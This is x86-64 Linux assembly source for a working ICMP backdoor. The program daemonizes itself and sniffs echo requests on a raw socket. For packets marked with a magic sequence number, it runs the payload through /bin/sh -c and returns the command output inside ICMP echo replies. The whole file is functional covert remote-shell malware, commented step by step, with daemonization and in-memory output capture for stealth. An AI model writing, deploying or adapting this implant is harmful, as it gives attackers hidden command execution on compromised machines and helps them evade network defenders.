section .bss
    fd_no resb 4                ; socket fd
    sniffed_data resb 1200      ; icmp data that returned to us
    incoming_addr resb 16       ; Where IP and Port will be written (16 bytes)
    addr_len      resd 1        ; Where the number "16" will be stored (4 bytes is enough)
    addr_ip resb 16             ; Buffer to store the extracted string IP address
section .data
    dir db '',0                 ; Empty string for memfd_create (anonymous RAM file)
    icmp_packet:
        type db 0               ; ICMP Type 0 (Echo Reply)
        code db 0               ; ICMP Code 0
        checksum dw 0           ; Checksum placeholder
        identifier dw 0x1234    ; ID to identify our packets
        sequence db 0xBE, 0xEF  ; Sequence our server will filter with this (0xBEEF)
        payload times 520 db 0  ; Buffer for the command execution output
        payload_len equ $ - payload ; Calculate the length of the payload
    newline db 10               ; ASCII newline character (\n)
    forip db 4                  ; Unused variable (legacy)
    space_char db 32            ; ASCII space character
    str_sh db '/bin/sh', 0      ; Shell executable path
    str_flag db '-c', 0         ; Command flag for /bin/sh
    argv_array:
        dq str_sh       ; Box 1: put the address of str_sh label (8 bytes)
        dq str_flag     ; Box 2: put the address of str_flag label (8 bytes)
        dq 0            ; Box 3: EMPTY FOR NOW! Will hold the command string address
        dq 0            ; Box 4: ZERO (Terminator indicating end of list)
section .text
global _start

; RAW SOCKET SYSCALL & DAEMONIZATION
_start:
    mov rax,57              ; sys_fork: Duplicate the process for daemonization
    syscall
    cmp rax,0               ; Check if we are the parent or the child
    jne _exit               ; If rax != 0, we are the parent. Exit immediately!
    mov rax,112             ; sys_setsid: Child creates a new session, detaching from terminal
    syscall

    mov rax, 41             ; sys_socket
    mov rdi, 2              ; AF_INET (IPv4)
    mov rsi, 3              ; SOCK_RAW (Raw access)
    mov rdx, 1              ; IPPROTO_ICMP (ICMP protocol)
    syscall                 ; sockfd is returned in rax
    mov [fd_no],eax         ; rax sockfd is copied into fd_no
;-----------------------------------------------------------------------------------------

_sniff:
; R8 R9 REGISTER SETUP FOR WRITING THE IP PART
    mov dword [addr_len], 16   ; First put 16 into the box (size of sockaddr_in)
    mov r8,incoming_addr       ; Pointer to store the sender's address
    mov r9,addr_len            ; Pointer to the address length
    xor r10,r10                ; Clear r10
;------------------------------------------------------------------------------------------
; --- CLEANUP OPERATION ---
    lea rdi, [sniffed_data]    ; Load address of our receive buffer
    xor al, al              ; al = 0 (byte to fill)
    mov rcx, 1200           ; Buffer size
    rep stosb               ; Zero everything out so old packets don't mix!
    ; ---------------------------

; RECV FROM / SNIFF INCOMING ICMP PACKETS
    mov rax,45              ; sys_recvfrom 
    mov edi,[fd_no]         ; fdno for recvfrom
    mov rsi,sniffed_data    ; memory address where data will be written
    mov rdx,1200            ; length of data to be read len()
    syscall
;----------------------------------------------------------------------------------
;--------------------------------CHECK FOR IF THE PACKET REQUEST--------------------

    cmp byte [sniffed_data + 20], 8 ; Check if ICMP Type (offset 20) is 8 (Echo Request)
    jne _sniff                      ; If not an echo request, ignore and keep sniffing

;------------------------------------------------------------------------------------------

    cmp rax,0               ; error handling: check recvfrom return value
    jl _error               ; Jump to error if rax < 0
    je _exit                ; Jump to exit if rax == 0
; JUMP IF BELOW
    cmp rax,28              ; Check if packet size is at least 28 bytes (20 IP + 8 ICMP header)
    jb _sniff               ; If smaller, ignore it
    mov cx,word[sniffed_data+26] ; Extract sequence number from ICMP header
    cmp cx,0xADDE           ; Check if sequence is 0xDEAD (Little endian 0xADDE)
    jne _sniff              ; If it's not our magic sequence, ignore it

    lea rax, [sniffed_data + 28] ; Calculate the start address of the payload (command)
    mov [argv_array+16],rax      ; Inject the command address into argv_array Box 3

; EXTRACTING IP AND ICMP HEADERS FROM THE DATA TO BE READ (ICMP+IP = 28). ADDITIONALLY PUSH RDX AND PUSH RSI SO REGISTERS DON'T MIX, WE WILL USE THEM IN THE PAYLOAD PART
    mov r14,rax                     ; fd number is in r14 within the loop
    sub r14,28                      ; Calculate actual payload length (total read - headers)
    lea rsi, [sniffed_data + 28]    ; rsi now points to the exact start of the data (payload)
    mov rdx,r14                     ; Store payload length in rdx
    push rdx                        ; Save payload length to stack
    push rsi                        ; Save payload address to stack

; ALGORITHM TO PROPERLY WRITE THE IP ADDRESS WILL RUN HERE, THEN IT WILL BE WRITTEN IN THE WRITE SYSCALL
    xor rdx,rdx                     ; Clear rdx
    xor rbx,rbx                     ; Clear rbx
    mov rcx,7                       ; Start reading IP bytes from offset 7
    mov rdi,15                      ; Start writing string from offset 15
_loopforip:
    mov bl,10                       ; we will divide by 10
    movzx ax,[incoming_addr+rcx]    ; Get one byte of the raw IP address
_divloop:
    div bl                          ; quotient in al, remainder in ah
    add ah,48                       ; convert remainder (int) to ASCII string character
    mov [addr_ip+rdi],ah            ; ip value (ASCII char) inside ax is written to buffer
    dec rdi                         ; Move string pointer backwards
    xor ah,ah                       ; clear remainder for the dirty whatever error
    cmp al,0                        ; loop until quotient is 0
    jg _divloop                     ; Keep dividing if > 0
    cmp rcx,4                       ; Check if we have processed all 4 IP bytes
    je _contiune                    ; If yes, skip adding a dot
    mov byte[addr_ip+rdi],46        ; Add a dot (.) ASCII 46
_contiune:
    dec rdi                         ; Move pointer back for the next byte
    dec rcx                         ; I can't write any more comments here, screw this situation :D even I'm not entirely sure, my brain is fried
    cmp rcx,3                       ; Continue loop until we hit offset 3
    jg _loopforip                   ; Loop back

;-----------------------------------------------------

; WE ARE PRINTING THE IP
    mov rax,1               ; sys_write
    mov rdi,1               ; stdout
    mov rdx,16              ; length of formatted IP string
    mov rsi,addr_ip         ; address of IP string
    syscall

; putting a space between ip and payload :D for cosmetic purposes
    mov rax,1               ; sys_write
    mov rdi,1               ; stdout
    mov rdx,1               ; length (1 char)
    mov rsi,space_char      ; address of space char
    syscall

;------------------------------------------------------
    pop rsi                 ; Restore payload address
    pop rdx                 ; Restore payload length
; WE ARE PRINTING THE PAYLOAD
    mov rax,1               ; sys_write
    mov rdi,1               ; write to terminal
    syscall                 ; Print the command payload
;-----------------------------------------------------

; NEW LINE so payloads and info don't get mixed up
    mov rax,1               ; sys_write
    mov rdi,1               ; write to terminal
    mov rsi,newline         ; printing nextline to terminal so it doesn't write directly adjacent after the first data arrives
    mov rdx,1               ; length (1 char)
    syscall

;------------------------------------------------------

;------------------------------------------------------
    jmp _execute_command            ; Jump to execute the parsed command



_checksum_cal:
    mov word [checksum],0          ; Reset checksum field to 0 before calculation
    xor rcx,rcx                    ; Clear rcx
    xor r13,r13                    ; Clear r13
    xor rax,rax                    ; Clear rax (accumulator)
    xor r12d,r12d                  ; Clear r12d
    mov rcx,8                      ; Start with 8 bytes for ICMP header          
    add rcx,r14                    ; 8 + r14 real payload from read = total length to calculate
    mov r13,0                      ; Offset counter
    xor rbx,rbx                    ; Clear rbx
.checksum_loop:
    movzx r12d,word[icmp_packet+r13] ; Read 2 bytes from packet
    add eax,r12d                   ; Add to accumulator
    add r13,2                      ; Move forward 2 bytes
    sub rcx,2                      ; Decrease remaining length by 2
    cmp rcx,2                      ; Check if we have at least 2 bytes left
    jge .checksum_loop             ; If yes, loop again
    cmp rcx,1                      ; Check if we have an odd byte left
    je .final                      ; Handle odd byte
    jmp .wrap                      ; Finish calculation
.final:
    movzx r12d, byte [icmp_packet + r13] ; Read the last 1 byte
    add eax, r12d                  ; Add to accumulator

.wrap:
    mov ebx,eax                    ; Copy sum to ebx
    shr ebx,16                     ; Shift right to get carry bits
    and eax, 0xFFFF                ; Keep only lower 16 bits of sum
    add ax, bx                     ; Add carry back to sum
    adc ax, 0                      ; Add any new carry
    not ax                         ; One's complement
    mov [checksum],ax              ; Store final checksum
    ret

_wait_for_child:
    ; rdi should already be filled with the PID returned from fork
    mov rax, 61             ; sys_wait4: Wait for process to change state
    mov rsi, 0              ; We don't want Status
    mov rdx, 0              ; No special options
    mov r10, 0              ; We don't want Usage
    syscall
    ret
;ERROR HANDLING
_error:
    mov rax,60              ; sys_exit
    mov rdi,1               ; Exit code 1 (Error)
    syscall
;------------------------------------------------------

_execute_command:

    call _memfd_create      ; Create anonymous RAM file
    push rax                ; fd no memfd_create on stack (save for later)

; ----------------------------------------------------------------
    mov rax,57              ; sys_fork: create child to run the command
    syscall

    cmp rax,0               ; Check if child or parent
    je _execve              ; If child (rax=0), go to _execve
    mov rdi, rax            ; If parent, move child PID to rdi

    call _wait_for_child    ; Parent waits for child to finish execution
    pop rdi                 ; Parent retrieves memfd fd from stack
    call _lseek             ; Rewind the memfd file to the beginning (offset 0)
;----------------------SYS OPEN (READ)------------------------------
    mov rax,0               ; sys_read
    lea rsi,[icmp_packet+8] ; Destination buffer: ICMP payload section
    mov rdx,512             ; Read up to 512 bytes
    syscall
    mov r14,rax             ; Save the number of bytes read into r14
    
    mov rax,3               ; sys_close: close the memfd file
    syscall                 ; file is deleted from RAM


    call _checksum_cal      ; Calculate checksum for the newly formulated reply packet

    xor r15,r15             ; Clear r15
    lea r15, [r14 + 8]      ; Total packet length = bytes read (r14) + ICMP Header (8)
    mov rax,44              ; sys_sendto
    mov rdi,[fd_no]         ; Raw socket fd
    lea rsi, [icmp_packet]  ; Packet buffer with payload
    mov rdx,r15             ; Packet size
    mov r10,0               ; Flags = 0
    lea r8,[incoming_addr]  ; Send it right back to where it came from!
    mov r9,16               ; Address length
    syscall
    jmp _sniff              ; Loop back and wait for next command


_execve:
;-----------------------------DUP2---------------------------------------------------
    pop rdi                 ; Retrieve memfd fd from stack
    call _dup2              ; Redirect stdout to memfd

    mov rax,59              ; sys_execve
    mov rdi,str_sh          ; Path to /bin/sh
    mov rsi,argv_array      ; Arguments array ('/bin/sh', '-c', 'command')
    mov rdx,0               ; Environment variables (NULL)
    syscall


_dup2:
    mov rax,33              ; sys_dup2
    mov rsi,1               ; stdout (1) might add Stderr later on with value 2 / not now
    syscall
    ret
_lseek:
    mov rax,8               ; sys_lseek
    mov rsi,0               ; return offset 0
    mov rdx,0               ; from start (SEEK_SET)
    syscall
    ret

_memfd_create:
    mov rax,319             ; sys_memfd_create
    mov rdi,dir             ; holding memory file name (empty string)
    mov rsi,0               ; should be 0 / if we set it to 1 MFD_CLOEXEC / will close automaticly
    syscall
    ret

; EXIT 0
_exit:
    mov rax,60              ; sys_exit
    mov rdi,0               ; Exit code 0 (Success)
    syscall
;------------------------------------------------------
